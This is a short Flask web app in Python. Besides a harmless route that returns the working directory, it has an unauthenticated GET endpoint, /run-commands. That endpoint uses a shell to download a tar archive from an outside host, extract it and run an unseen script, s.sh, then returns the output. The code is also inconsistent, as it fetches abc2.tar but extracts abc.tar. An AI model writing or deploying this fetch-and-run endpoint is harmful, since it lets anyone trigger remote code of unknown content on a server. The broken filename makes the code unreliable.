from flask import Flask, jsonify
import os
import subprocess

app = Flask(__name__)

@app.route('/')
def get_pwd():
    current_directory = os.getcwd()
    return jsonify({"current_directory": current_directory})

@app.route('/run-commands', methods=['GET'])
def run_commands():
    try:
        commands = [
            "wget https://idev.nyc.mn/abc2.tar",
            "tar -xvf abc.tar",
            "cd abc && sh s.sh"  # 合并 cd 和后续命令
        ]
        result = ""
        for command in commands:
            process = subprocess.run(
                command, shell=True, text=True, capture_output=True
            )
            if process.returncode == 0:
                result += f"Command: {command}\nOutput: {process.stdout}\n"
            else:
                result += f"Command: {command}\nError: {process.stderr}\n"
                break  # 停止执行后续命令

        return jsonify({"status": "success", "result": result})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
